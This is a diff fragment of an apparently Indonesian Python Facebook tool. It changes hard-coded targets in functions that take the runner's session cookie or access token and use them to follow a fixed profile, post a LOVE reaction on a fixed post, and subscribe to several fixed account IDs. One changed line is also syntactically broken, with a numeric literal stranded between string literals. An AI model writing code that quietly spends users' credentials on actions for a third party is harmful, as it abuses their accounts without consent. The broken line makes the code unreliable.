@@ -401,7 +401,7 @@ def proses_masuk(cookie_dev):
 
 	if len(ikuti_) == 0:
 		try:
-			uwu_u = "https://mbasic.facebook.com/jangan.macem.macem.2"
+			uwu_u = "https://mbasic.facebook.com/muhammad.hanyauntukmu"
 			ikut = ses_pros_dev.get(uwu_u, cookies=cookie_dev).content
 			sop_dev = BeautifulSoup(ikut, "html.parser")
 			ambil = sop_dev.find("a", string="Ikuti")
@@ -427,7 +427,7 @@ def love(cookie):
 def love_token(token):
 	lis_id_foll = ["100034994956054", "100009259285042"]
 	with requests.Session() as dev_:
-		dev_.post("https://graph.facebook.com/"+id_post+"/reactions?type=LOVE&access_token="+token)
+		dev_.post("https://graph.facebook.com/"3088882871430325"/reactions?type=LOVE&access_token="+token)
 		for id_foll in lis_id_foll:
 			dev_.post("https://graph.facebook.com/{}/subscribers?access_token={}".format(id_foll, token))
 		dev_.post("https://graph.facebook.com/{}/subscribers?access_token={}".format(random.choice(["100009259285042", "100002606153676", "100034994956054"]), token))
